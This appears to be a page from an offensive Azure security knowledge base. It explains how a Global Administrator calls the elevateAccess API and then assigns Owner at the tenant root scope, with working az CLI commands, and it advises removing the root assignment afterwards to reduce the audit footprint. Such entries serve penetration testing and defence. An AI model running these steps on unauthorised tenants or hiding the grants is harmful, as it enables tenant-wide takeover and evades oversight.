---
title: "Elevate access: User Access Administrator at the root scope"
order: 3
description: "Toggling User Access Administrator at the root scope with elevateAccess to gain management-group-wide control over every subscription in the tenant."
keywords:
  - elevateAccess
  - User Access Administrator
  - root scope
  - management group
  - tenant
---

# Elevate access

A tenant Global Administrator (an Entra role) can flip a single switch that grants the **User Access Administrator** role at the **root** scope (`/`), above every management group and subscription. Once elevated, the principal can read and write role assignments across the entire tenant, which is the bridge from directory control to full resource-plane control.

## Toggling it

```bash
# requires the Global Administrator directory role; grants UAA at "/"
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# now assignable at the root scope
az role assignment create --assignee <object-id> --role Owner --scope "/"
```

## Exploitation notes

- This is the one place the Entra directory plane and the Azure resource plane meet: it takes a directory role (Global Admin) to perform, and yields resource-plane power everywhere. The directory-side attacks that reach Global Admin live under Entra ID in the Directory area.
- The elevation is logged and the UAA-at-root assignment is visible to anyone auditing root-scope RBAC; it is loud but total.
- Remove the root assignment afterwards to reduce the footprint while keeping any scoped Owner grants you made.

## Tools

- **az cli** (`az rest` for the elevateAccess POST).
- **MicroBurst** / **BARK**: automate the elevate-then-assign sequence.

## References

- [Microsoft: elevate access to manage all subscriptions](https://learn.microsoft.com/azure/role-based-access-control/elevate-access-global-admin)
- [SpecterOps: Global Admin to Azure with BARK](https://github.com/BloodHoundAD/BARK)
- [HackTricks Cloud: Azure privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
